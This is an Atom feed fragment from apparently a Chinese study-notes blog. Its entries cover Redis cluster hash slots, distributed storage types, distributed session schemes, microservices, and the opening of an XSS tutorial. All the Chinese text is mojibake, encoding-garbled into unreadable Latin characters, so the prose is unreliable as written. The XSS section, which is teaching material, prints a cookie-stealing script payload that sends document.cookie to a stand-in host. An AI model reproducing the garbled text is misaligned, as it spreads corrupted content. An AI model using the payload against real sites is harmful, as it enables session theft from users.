<p>ä¸Šè¿°éƒ½æ˜¯ç‰©ç†èŠ‚ç‚¹çš„åˆ†å¸ƒåšç®—æ³•ï¼Œè€Œredis clusteræ˜¯é€šè¿‡åœ¨èŠ‚ç‚¹ä¸­åˆ†å¸ƒè™šæ‹Ÿçš„å°èŠ‚ç‚¹æ¥åˆ†å¸ƒæ•°æ®ã€‚redis clusterä¼šåœ¨æ•´ä¸ªé›†ç¾¤èŠ‚ç‚¹ä¸­åˆ†å¸ƒ 16384 ä¸ªè™šæ‹Ÿslotã€‚æ¯ä¸ªèŠ‚ç‚¹åˆ†é…ä¸€éƒ¨åˆ†slotã€‚ç„¶åæ‰€æœ‰çš„keyçš„hashå¯¹ 16384 å–æ¨¡ï¼Œä»è€ŒçŸ¥é“åœ¨å“ªä¸ªslotï¼Œä¹Ÿå°±çŸ¥é“äº†æ•°æ®åœ¨å“ªä¸ªèŠ‚ç‚¹ä¸Šã€‚ å½“ä¸€ä¸ªèŠ‚ç‚¹æŒ‚äº†æ—¶ï¼Œå°±ä¼šæŠŠè¿™ä¸ªèŠ‚ç‚¹ä¸Šçš„slotè¿ç§»åˆ°å…¶ä»–èŠ‚ç‚¹ä¸Šã€‚</p>
<p>å¯ä»¥è®¤ä¸ºhash slot ç®—æ³•ï¼Œæ˜¯ä¸€è‡´æ€§hashç®—æ³•çš„ä¼˜åŒ–ã€‚</p>
<p>ä¼˜ç‚¹ï¼šå³æ‹¥æœ‰äº†ä¸€è‡´æ€§hashç®—æ³•çš„ä¼˜ç‚¹ï¼Œåˆé¿å…äº†çƒ­ç‚¹æ•°æ®ï¼›</p>
<p>masterçš„å¢åŠ å’Œç§»é™¤ä¹Ÿæ˜¯éå¸¸æ–¹é¢ï¼Œå¢åŠ masterï¼Œå°±æŠŠå…¶ä»–èŠ‚ç‚¹çš„slotç§»åŠ¨åˆ°è¿™ä¸ªmasterã€‚ç§»é™¤masterï¼Œå°±æŠŠå½“å‰masterçš„slotç§»åŠ¨åˆ°å…¶ä»–èŠ‚ç‚¹ã€‚</p>
<h3 id="æ•°æ®ä¸€è‡´æ€§" tabindex="-1"> æ•°æ®ä¸€è‡´æ€§</h3>
<h3 id="å®¹é”™" tabindex="-1"> å®¹é”™</h3>
<h2 id="åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿåˆ†ç±»" tabindex="-1"> åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿåˆ†ç±»</h2>
<p>åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿéœ€è¦å­˜å‚¨çš„æ•°æ®å¤šç§å¤šæ ·ï¼Œå¤§è‡´ä¸Šå¯åˆ†ä¸ºï¼šéç»“æ„åŒ–æ•°æ®ï¼Œå¦‚æ–‡æœ¬æ–‡ä»¶ã€å›¾ç‰‡ã€è§†é¢‘å’ŒéŸ³é¢‘ç­‰æ ¼å¼ï¼›ç»“æ„åŒ–æ•°æ®ï¼Œä¸€èˆ¬å­˜åœ¨å…³ç³»æ•°æ®åº“ä¸­ï¼Œå¯ä»¥ç”¨äºŒç»´å…³ç³»è¡¨ç»“æ„æ¥è¡¨ç¤ºï¼Œæ¨¡å¼ä¸å†…å®¹æ˜¯åˆ†å¼€çš„ï¼›åŠç»“æ„åŒ–æ•°æ®ï¼Œå¦‚HTMLæ–‡æ¡£ï¼Œæ¨¡å¼ç»“æ„ä¸å†…å®¹æ˜¯æ”¾åœ¨ä¸€èµ·çš„ã€‚</p>
<h3 id="åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ" tabindex="-1"> åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ</h3>
<p>äº’è”ç½‘åº”ç”¨éœ€è¦å­˜å‚¨å¤§é‡çš„å›¾ç‰‡ã€ç…§ç‰‡å’Œè§†é¢‘ç­‰éç»“æ„åŒ–æ•°æ®å¯¹è±¡ï¼Œè¿™ç±»æ•°æ®ä»¥å¯¹è±¡çš„å½¢å¼ç»„ç»‡ï¼Œå¯¹è±¡ä¹‹é—´æ²¡æœ‰å…³è”ï¼Œè¿™æ ·çš„æ•°æ®ä¸€èˆ¬ç§°ä¸ºBlob(Binary large object)æ•°æ®ã€‚</p>
<p>åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿé€‚åˆå­˜å‚¨Blobå¯¹è±¡ï¼Œå…¸å‹çš„å¦‚è°·æ­Œçš„GFSä»¥åŠå®ƒçš„å¼€æºå®ç°HDFSã€‚åœ¨ç³»ç»Ÿå®ç°å±‚é¢ï¼Œåˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿå†…éƒ¨æŒ‰ç…§æ•°æ®å—ï¼ˆchunkï¼‰æ¥ç»„ç»‡æ•°æ®ï¼Œæ¯ä¸ªæ•°æ®å—çš„å¤§å°ç›¸åŒï¼Œæ¯ä¸ªæ•°æ®å—å¯ä»¥åŒ…å«å¤šä¸ªBlob å¯¹è±¡æˆ–è€…å®šé•¿å—ï¼Œä¸€ä¸ªå¤§æ–‡ä»¶ä¹Ÿå¯ä»¥æ‹†åˆ†æˆå¤šä¸ªæ•°æ®å—ã€‚</p>
<h3 id="åˆ†å¸ƒå¼é”®å€¼ç³»ç»Ÿ" tabindex="-1"> åˆ†å¸ƒå¼é”®å€¼ç³»ç»Ÿ</h3>
<p>åˆ†å¸ƒå¼é”®å€¼ç³»ç»Ÿå­˜å‚¨å…³ç³»ç®€å•çš„åŠç»“æ„åŒ–æ•°æ®ï¼Œå®ƒåªæä¾›ä¸»é”®çš„CRUDåŠŸèƒ½ï¼Œå¦‚Dynamoã€Rediså’ŒMemcacheã€‚ä»æ•°æ®ç»“æ„æ¥çœ‹ï¼Œåˆ†å¸ƒå¼é”®å€¼ç³»ç»Ÿä¸ä¼ ç»Ÿçš„å“ˆå¸Œè¡¨æ¯”è¾ƒç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿæ”¯æŒå°†æ•°æ®åˆ†å¸ƒåˆ°é›†ç¾¤ä¸­çš„å¤šä¸ªå­˜å‚¨ç»“ç‚¹ã€‚åˆ†å¸ƒå¼é”®å€¼ç³»ç»Ÿæ˜¯åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿçš„ä¸€ç§ç®€åŒ–å®ç°ï¼Œä¸€èˆ¬ç”¨ä½œç¼“å­˜ã€‚ä¸€è‡´æ€§å“ˆå¸Œæ˜¯åˆ†å¸ƒå¼é”®å€¼ç³»ç»Ÿä¸­å¸¸ç”¨çš„æ•°æ®åˆ†å¸ƒæŠ€æœ¯ã€‚</p>
<h3 id="åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿ" tabindex="-1"> åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿ</h3>
<p>åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿç”¨äºå­˜å‚¨å…³ç³»è¾ƒä¸ºå¤æ‚çš„åŠç»“æ„åŒ–æ•°æ®ï¼Œä¸åˆ†å¸ƒå¼é”®å€¼ç³»ç»Ÿç›¸æ¯”ï¼Œåˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿä¸ä»…ä»…æ”¯æŒç®€å•çš„CRUD æ“ä½œï¼Œè€Œä¸”æ”¯æŒæ‰«ææŸä¸ªä¸»é”®èŒƒå›´ã€‚åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿä»¥è¡¨æ ¼ä¸ºå•ä½ç»„ç»‡æ•°æ®ï¼Œæ¯ä¸ªè¡¨æ ¼åŒ…æ‹¬å¾ˆå¤šè¡Œï¼Œé€šè¿‡ä¸»é”®æ ‡è¯†ä¸€è¡Œï¼Œæ”¯æŒæ ¹æ®ä¸»é”®çš„CRUDåŠŸèƒ½ä»¥åŠèŒƒå›´æŸ¥æ‰¾åŠŸèƒ½ã€‚</p>
<p>åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿå€Ÿé‰´äº†å¾ˆå¤šå…³ç³»æ•°æ®åº“çš„æŠ€æœ¯ï¼Œä¾‹å¦‚æ”¯æŒæŸç§ç¨‹åº¦ä¸Šçš„äº‹åŠ¡ã€‚å…¸å‹çš„ç³»ç»Ÿå¦‚Bigtableã€HBaseå’ŒDynamoDBã€‚ä¸åˆ†å¸ƒå¼æ•°æ®åº“ç›¸æ¯”ï¼Œåˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿä¸»è¦é’ˆå¯¹å•å¼ è¡¨æ ¼çš„æ“ä½œï¼Œä¸æ”¯æŒä¸€äº›ç‰¹åˆ«å¤æ‚çš„æ“ä½œï¼Œæ¯”å¦‚å¤šè¡¨å…³è”ã€å¤šè¡¨è¿æ¥ã€åµŒå¥—å­æŸ¥è¯¢ã€‚è€Œä¸”åœ¨åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿä¸­ï¼ŒåŒä¸€ä¸ªè¡¨æ ¼çš„å¤šä¸ªæ•°æ®è¡Œä¹Ÿä¸è¦æ±‚åŒ…å«ç›¸åŒç±»å‹çš„åˆ—ï¼Œé€‚åˆåŠç»“æ„åŒ–æ•°æ®ã€‚åˆ†å¸ƒå¼è¡¨æ ¼ç³»ç»Ÿæ˜¯ä¸€ç§å¾ˆå¥½çš„æƒè¡¡ï¼Œè¿™ç±»ç³»ç»Ÿå¯ä»¥åšåˆ°è¶…å¤§è§„æ¨¡ï¼Œè€Œä¸”æ”¯æŒè¾ƒå¤šçš„åŠŸèƒ½ï¼Œä½†å®ç°å¾€å¾€æ¯”è¾ƒå¤æ‚ã€‚</p>
<h3 id="åˆ†å¸ƒå¼æ•°æ®åº“" tabindex="-1"> åˆ†å¸ƒå¼æ•°æ®åº“</h3>
<p>åˆ†å¸ƒå¼æ•°æ®åº“ä¸€èˆ¬æ˜¯ä»å•æœºå…³ç³»æ•°æ®åº“æ‰©å±•è€Œæ¥ï¼Œç”¨äºå­˜å‚¨ç»“æ„åŒ–æ•°æ®ã€‚åˆ†å¸ƒå¼æ•°æ®åº“é‡‡ç”¨äºŒç»´è¡¨æ ¼ç»„ç»‡æ•°æ®ï¼Œæä¾›SQLå…³ç³»æŸ¥è¯¢è¯­è¨€ï¼Œæ”¯æŒå¤šè¡¨å…³è”ï¼ŒåµŒå¥—å­æŸ¥è¯¢ç­‰å¤æ‚æ“ä½œï¼Œå¹¶æä¾›æ•°æ®åº“äº‹åŠ¡ä»¥åŠå¹¶å‘æ§åˆ¶ã€‚å…¸å‹çš„å¦‚MySQLæ•°æ®åº“é›†ç¾¤ã€Amazon RDSåŠMicrosoft SQL Azureã€‚</p>
<h1 id="åˆ†å¸ƒå¼session" tabindex="-1"> åˆ†å¸ƒå¼session</h1>
<h2 id="session-stick" tabindex="-1"> Session Stick</h2>
<p>Session Stick æ–¹æ¡ˆå³å°†å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚éƒ½è½¬å‘è‡³åŒä¸€å°æœåŠ¡å™¨ï¼Œè¿™å°±éœ€è¦è´Ÿè½½å‡è¡¡å™¨èƒ½å¤Ÿæ ¹æ®æ¯æ¬¡è¯·æ±‚çš„ä¼šè¯æ ‡è¯†ï¼ˆSessionIdï¼‰æ¥è¿›è¡Œè¯·æ±‚è½¬å‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-25-46.png" alt="" loading="lazy"></p>
<h2 id="session-replication" tabindex="-1"> Session Replication</h2>
<p>Session Replication çš„æ–¹æ¡ˆåˆ™ä¸å¯¹è´Ÿè½½å‡è¡¡å™¨åšæ›´æ”¹ï¼Œè€Œæ˜¯åœ¨WebæœåŠ¡å™¨ä¹‹é—´å¢åŠ äº†ä¼šè¯æ•°æ®åŒæ­¥çš„åŠŸèƒ½ï¼Œå„ä¸ªæœåŠ¡å™¨ä¹‹é—´é€šè¿‡åŒæ­¥ä¿è¯ä¸åŒWebæœåŠ¡å™¨ä¹‹é—´çš„Sessionæ•°æ®çš„ä¸€è‡´æ€§ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-26-07.png" alt="" loading="lazy"></p>
<p>Session Replication æ–¹æ¡ˆå¯¹è´Ÿè½½å‡è¡¡å™¨ä¸å†æœ‰è¦æ±‚ï¼Œä½†æ˜¯åŒæ ·ä¼šå¸¦æ¥ä»¥ä¸‹é—®é¢˜ï¼š</p>
<ul>
<li>åŒæ­¥Sessionæ•°æ®ä¼šé€ æˆé¢å¤–çš„ç½‘ç»œå¸¦å®½çš„å¼€é”€ï¼Œåªè¦Sessionæ•°æ®æœ‰å˜åŒ–ï¼Œå°±éœ€è¦å°†æ–°äº§ç”Ÿçš„Sessionæ•°æ®åŒæ­¥åˆ°å…¶ä»–æœåŠ¡å™¨ä¸Šï¼ŒæœåŠ¡å™¨æ•°é‡è¶Šå¤šï¼ŒåŒæ­¥å¸¦æ¥çš„ç½‘ç»œå¸¦å®½å¼€é”€ä¹Ÿå°±è¶Šå¤§ã€‚</li>
<li>æ¯å°WebæœåŠ¡å™¨éƒ½éœ€è¦ä¿å­˜å…¨éƒ¨çš„Sessionæ•°æ®ï¼Œå¦‚æœæ•´ä¸ªé›†ç¾¤çš„Sessionæ•°é‡å¤ªå¤šçš„è¯ï¼Œåˆ™å¯¹äºæ¯å°æœºå™¨ç”¨äºä¿å­˜Sessionæ•°æ®çš„å ç”¨ä¼šå¾ˆä¸¥é‡ã€‚</li>
</ul>
<h2 id="session-æ•°æ®é›†ä¸­å­˜å‚¨" tabindex="-1"> Session æ•°æ®é›†ä¸­å­˜å‚¨</h2>
<p>Session æ•°æ®é›†ä¸­å­˜å‚¨æ–¹æ¡ˆåˆ™æ˜¯å°†é›†ç¾¤ä¸­çš„æ‰€æœ‰Sessioné›†ä¸­å­˜å‚¨èµ·æ¥ï¼ŒWebæœåŠ¡å™¨æœ¬èº«åˆ™å¹¶ä¸å­˜å‚¨Sessionæ•°æ®ï¼Œä¸åŒçš„WebæœåŠ¡å™¨ä»åŒæ ·çš„åœ°æ–¹æ¥è·å–Sessionï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚
<img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-26-55.png" alt="" loading="lazy"></p>
<p>ç›¸å¯¹äºSession Replicationæ–¹æ¡ˆï¼Œæ­¤æ–¹æ¡ˆçš„Sessionæ•°æ®å°†ä¸ä¿å­˜åœ¨æœ¬æœºï¼Œå¹¶ä¸”WebæœåŠ¡å™¨ä¹‹é—´ä¹Ÿæ²¡æœ‰äº†Sessionæ•°æ®çš„å¤åˆ¶ï¼Œä½†æ˜¯è¯¥æ–¹æ¡ˆå­˜åœ¨çš„é—®é¢˜åœ¨äºï¼š</p>
<p>è¯»å†™Sessionæ•°æ®å¼•å…¥äº†ç½‘ç»œæ“ä½œï¼Œè¿™ç›¸å¯¹äºæœ¬æœºçš„æ•°æ®è¯»å–æ¥è¯´ï¼Œé—®é¢˜å°±åœ¨äºå­˜åœ¨æ—¶å»¶å’Œä¸ç¨³å®šæ€§ï¼Œä½†æ˜¯é€šä¿¡å‘ç”Ÿåœ¨å†…ç½‘ï¼Œåˆ™é—®é¢˜ä¸å¤§ã€‚
å¦‚æœé›†ä¸­å­˜å‚¨Sessionçš„æœºå™¨æˆ–é›†ç¾¤å‡ºç°é—®é¢˜ï¼Œåˆ™ä¼šå½±å“åº”ç”¨ã€‚</p>
<h2 id="cookie-based" tabindex="-1"> Cookie Based</h2>
<p>Cookie Based æ–¹æ¡ˆæ˜¯å°†Sessionæ•°æ®æ”¾åœ¨Cookieé‡Œï¼Œè®¿é—®WebæœåŠ¡å™¨çš„æ—¶å€™ï¼Œå†ç”±WebæœåŠ¡å™¨ç”Ÿæˆå¯¹åº”çš„Sessionæ•°æ®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚
<img src="@source/assets/cs-note/distribute/mk-2020-07-13-21-27-28.png" alt="" loading="lazy"></p>
<p>ä½†æ˜¯Cookie Based æ–¹æ¡ˆä¾ç„¶å­˜åœ¨ä¸è¶³ï¼š</p>
<ul>
<li>Cookieé•¿åº¦çš„é™åˆ¶ã€‚è¿™ä¼šå¯¼è‡´Sessioné•¿åº¦çš„é™åˆ¶ã€‚</li>
<li>å®‰å…¨æ€§ã€‚Seesionæ•°æ®æœ¬æ¥æ˜¯æœåŠ¡ç«¯æ•°æ®ï¼Œå´è¢«ä¿å­˜åœ¨äº†å®¢æˆ·ç«¯ï¼Œå³ä½¿å¯ä»¥åŠ å¯†ï¼Œä½†æ˜¯ä¾ç„¶å­˜åœ¨ä¸å®‰å…¨æ€§ã€‚</li>
<li>å¸¦å®½æ¶ˆè€—ã€‚è¿™é‡Œä¸æ˜¯æŒ‡å†…éƒ¨WebæœåŠ¡å™¨ä¹‹é—´çš„å®½å¸¦æ¶ˆè€—ï¼Œè€Œæ˜¯æ•°æ®ä¸­å¿ƒçš„æ•´ä½“å¤–éƒ¨å¸¦å®½çš„æ¶ˆè€—ã€‚</li>
<li>æ€§èƒ½å½±å“ã€‚æ¯æ¬¡HTTPè¯·æ±‚å’Œå“åº”éƒ½å¸¦æœ‰Seesionæ•°æ®ï¼Œå¯¹WebæœåŠ¡å™¨æ¥è¯´ï¼Œåœ¨åŒæ ·çš„å¤„ç†æƒ…å†µä¸‹ï¼Œå“åº”çš„ç»“æœè¾“å‡ºè¶Šå°‘ï¼Œæ”¯æŒçš„å¹¶å‘å°±ä¼šè¶Šé«˜ã€‚</li>
</ul>
<h1 id="åˆ†å¸ƒå¼è®¡ç®—" tabindex="-1"> åˆ†å¸ƒå¼è®¡ç®—</h1>
<p>æ‰€è°“åˆ†å¸ƒå¼è®¡ç®—æ˜¯ä¸€é—¨è®¡ç®—æœºç§‘å­¦ï¼Œå®ƒç ”ç©¶å¦‚ä½•æŠŠä¸€ä¸ªéœ€è¦éå¸¸å·¨å¤§çš„è®¡ç®—èƒ½åŠ›æ‰èƒ½è§£å†³çš„é—®é¢˜åˆ†æˆè®¸å¤šå°çš„éƒ¨åˆ†ï¼Œç„¶åæŠŠè¿™äº›éƒ¨åˆ†åˆ†é…ç»™è®¸å¤šè®¡ç®—æœºè¿›è¡Œå¤„ç†ï¼Œæœ€åæŠŠè¿™äº›è®¡ç®—ç»“æœç»¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆçš„ç»“æœã€‚ åˆ†å¸ƒå¼ç½‘ç»œå­˜å‚¨æŠ€æœ¯æ˜¯å°†æ•°æ®åˆ†æ•£çš„å­˜å‚¨äºå¤šå°ç‹¬ç«‹çš„æœºå™¨è®¾å¤‡ä¸Šã€‚åˆ†å¸ƒå¼ç½‘ç»œå­˜å‚¨ç³»ç»Ÿé‡‡ç”¨å¯æ‰©å±•çš„ç³»ç»Ÿç»“æ„ï¼Œåˆ©ç”¨å¤šå°å­˜å‚¨æœåŠ¡å™¨åˆ†æ‹…å­˜å‚¨è´Ÿè·ï¼Œåˆ©ç”¨ä½ç½®æœåŠ¡å™¨å®šä½å­˜å‚¨ä¿¡æ¯ï¼Œä¸ä½†è§£å†³äº†ä¼ ç»Ÿé›†ä¸­å¼å­˜å‚¨ç³»ç»Ÿä¸­å•å­˜å‚¨æœåŠ¡å™¨çš„ç“¶é¢ˆé—®é¢˜ï¼Œè¿˜æé«˜äº†ç³»ç»Ÿçš„å¯é æ€§ã€å¯ç”¨æ€§å’Œæ‰©å±•æ€§ã€‚</p>
<p><a href="https://blog.csdn.net/qq_34337272/article/details/80549020" target="_blank" rel="noopener noreferrer">å…³äºåˆ†å¸ƒå¼è®¡ç®—çš„ä¸€äº›æ¦‚å¿µ</a></p>
<h1 id="å‚è€ƒ" tabindex="-1"> å‚è€ƒ</h1>
<ul>
<li>å€ªè¶…. ä» Paxos åˆ° ZooKeeper : åˆ†å¸ƒå¼ä¸€è‡´æ€§åŸç†ä¸å®è·µ [M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2015.</li>
<li><a href="https://redis.io/topics/distlock" target="_blank" rel="noopener noreferrer">Distributed locks with Redis</a></li>
<li><a href="http://www.linkedkeeper.com/detail/blog.action?bid=1023" target="_blank" rel="noopener noreferrer">æµ…è°ˆåˆ†å¸ƒå¼é”</a></li>
<li><a href="http://www.dengshenyu.com/java/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/2017/10/23/zookeeper-distributed-lock.html" target="_blank" rel="noopener noreferrer">åŸºäº Zookeeper çš„åˆ†å¸ƒå¼é”</a></li>
<li><a href="http://thesecretlivesofdata.com/raft" target="_blank" rel="noopener noreferrer">Raft: Understandable Distributed Consensus</a></li>
<li><a href="https://www.cnblogs.com/savorboard/p/distributed-system-transaction-consistency.html" target="_blank" rel="noopener noreferrer">èŠèŠåˆ†å¸ƒå¼äº‹åŠ¡ï¼Œå†è¯´è¯´è§£å†³æ–¹æ¡ˆ</a></li>
<li><a href="https://coolshell.cn/articles/10910.html" target="_blank" rel="noopener noreferrer">åˆ†å¸ƒå¼ç³»ç»Ÿçš„äº‹åŠ¡å¤„ç†</a></li>
<li><a href="https://juejin.im/entry/577c6f220a2b5800573492be" target="_blank" rel="noopener noreferrer">æ·±å…¥ç†è§£åˆ†å¸ƒå¼äº‹åŠ¡</a></li>
<li><a href="http://www.colooshiki.com/index.php/2017/04/20/what-is-cap-theorem-in-distributed-database-system/" target="_blank" rel="noopener noreferrer">What is CAP theorem in distributed database system?</a></li>
<li><a href="http://harry.me/blog/2014/12/27/neat-algorithms-paxos/" target="_blank" rel="noopener noreferrer">NEAT ALGORITHMS - PAXOS</a></li>
<li><a href="https://angus.nyc/2012/paxos-by-example/" target="_blank" rel="noopener noreferrer">Paxos By Example</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">å¾®æœåŠ¡ç®€ä»‹</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%BE%AE%E6%9C%8D%E5%8A%A1.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E5%BE%AE%E6%9C%8D%E5%8A%A1.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[

<h1 id="å¾®æœåŠ¡ç®€ä»‹" tabindex="-1"> å¾®æœåŠ¡ç®€ä»‹</h1>
<p>å¾®æœåŠ¡æ¶æ„çš„å‡ºç°ä¸»è¦æ˜¯ä¸ºäº†æœ‰æ•ˆçš„æ‹†åˆ†åº”ç”¨ï¼Œä»¥å®ç°åº”ç”¨é—´çš„è§£è€¦ã€æ•æ·å¼€å‘å’Œéƒ¨å±ã€‚æœåŠ¡è¢«æ‹†å¾—å¤šäº†è‡ªç„¶å°±å¢åŠ äº†å¤æ‚åº¦ï¼šå®¢æˆ·ç«¯å¦‚ä½•è®¿é—®å¾®æœåŠ¡çš„èƒ½åŠ›ã€æœåŠ¡ä¹‹é—´å¦‚ä½•é€šä¿¡ã€å…¶ä¸­ä¸€ä¸ªæœåŠ¡æŒ‚äº†å¦‚ä½•è§£å†³é—®é¢˜ç­‰ç­‰ã€‚å› æ­¤å¾®æœåŠ¡æ¡†æ¶åº”è¿è€Œç”Ÿï¼Œå¸®åŠ©æˆ‘ä»¬è§£å†³ä¸Šè¿°è¿™äº›é—®é¢˜ï¼Œæ„‰å¿«çš„å¼€å‘ä¸šåŠ¡é€»è¾‘ã€‚</p>
<h2 id="soaåˆ°msaçš„è¿›åŒ–" tabindex="-1"> SOAåˆ°MSAçš„è¿›åŒ–</h2>
<p>SOAé¢å‘æœåŠ¡æ¶æ„
ç”±äºä¸šåŠ¡å‘å±•åˆ°ä¸€å®šå±‚åº¦åï¼Œéœ€è¦å¯¹æœåŠ¡è¿›è¡Œè§£è€¦ï¼Œè¿›è€ŒæŠŠä¸€ä¸ªå•ä¸€çš„å¤§ç³»ç»ŸæŒ‰é€»è¾‘æ‹†åˆ†æˆä¸åŒçš„å­ç³»ç»Ÿï¼Œé€šè¿‡æœåŠ¡æ¥å£æ¥é€šè®¯ï¼Œé¢å‘æœåŠ¡çš„è®¾è®¡æ¨¡å¼ï¼Œæœ€ç»ˆéœ€è¦æ€»çº¿é›†æˆæœåŠ¡ï¼Œè€Œä¸”å¤§éƒ¨åˆ†æ—¶å€™è¿˜å…±äº«æ•°æ®åº“ï¼Œå‡ºç°å•ç‚¹æ•…éšœçš„æ—¶å€™ä¼šå¯¼è‡´æ€»çº¿å±‚é¢çš„æ•…éšœï¼Œæ›´è¿›ä¸€æ­¥å¯èƒ½ä¼šæŠŠæ•°æ®åº“æ‹–å®ï¼Œæ‰€ä»¥æ‰æœ‰äº†æ›´åŠ ç‹¬ç«‹çš„è®¾è®¡æ–¹æ¡ˆçš„å‡ºç°ã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-04-13.png" alt="" loading="lazy"></p>
<p>MSAå¾®æœåŠ¡æ¶æ„
å¾®æœåŠ¡æ˜¯çœŸæ­£æ„ä¹‰ä¸Šçš„ç‹¬ç«‹æœåŠ¡ï¼Œä»æœåŠ¡å…¥å£åˆ°æ•°æ®æŒä¹…å±‚ï¼Œé€»è¾‘ä¸Šéƒ½æ˜¯ç‹¬ç«‹éš”ç¦»çš„ï¼Œæ— éœ€æœåŠ¡æ€»çº¿æ¥æ¥å…¥ï¼Œä½†åŒæ—¶å¢åŠ äº†æ•´ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿçš„æ­å»ºå’Œç®¡ç†éš¾åº¦ï¼Œéœ€è¦å¯¹æœåŠ¡è¿›è¡Œç¼–æ’å’Œç®¡ç†ï¼Œæ‰€ä»¥ä¼´éšç€å¾®æœåŠ¡çš„å…´èµ·ï¼Œå¾®æœåŠ¡ç”Ÿæ€çš„æ•´å¥—æŠ€æœ¯æ ˆä¹Ÿéœ€è¦æ— ç¼æ¥å…¥ï¼Œæ‰èƒ½æ”¯æ’‘èµ·å¾®æœåŠ¡çš„æ²»ç†ç†å¿µã€‚</p>
<p><img src="@source/assets/cs-note/distribute/mk-2020-07-12-15-04-43.png" alt="" loading="lazy"></p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€è·¨ç«™è„šæœ¬æ”»å‡»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
<li></li>
</ul>

<h1 id="ä¸€ã€è·¨ç«™è„šæœ¬æ”»å‡»" tabindex="-1"> ä¸€ã€è·¨ç«™è„šæœ¬æ”»å‡»</h1>
<h2 id="æ¦‚å¿µ" tabindex="-1"> æ¦‚å¿µ</h2>
<p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scripting, XSSï¼‰ï¼Œå¯ä»¥å°†ä»£ç æ³¨å…¥åˆ°ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šï¼Œè¿™ç§ä»£ç åŒ…æ‹¬ HTML å’Œ JavaScriptã€‚</p>
<h2 id="æ”»å‡»åŸç†" tabindex="-1"> æ”»å‡»åŸç†</h2>
<p>ä¾‹å¦‚æœ‰ä¸€ä¸ªè®ºå›ç½‘ç«™ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸Šé¢å‘å¸ƒä»¥ä¸‹å†…å®¹ï¼š</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>location<span>.</span>href<span>=</span><span>"//domain.com/?c="</span> <span>+</span> document<span>.</span>cookie</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre></div><p>ä¹‹åè¯¥å†…å®¹å¯èƒ½ä¼šè¢«æ¸²æŸ“æˆä»¥ä¸‹å½¢å¼ï¼š</p>
<div><pre><code><span><span><span>&lt;</span>p</span><span>></span></span><span><span><span>&lt;</span>script</span><span>></span></span><span><span>location<span>.</span>href<span>=</span><span>"//domain.com/?c="</span> <span>+</span> document<span>.</span>cookie</span></span><span><span><span>&lt;/</span>script</span><span>></span></span><span><span><span>&lt;/</span>p</span><span>></span></span>
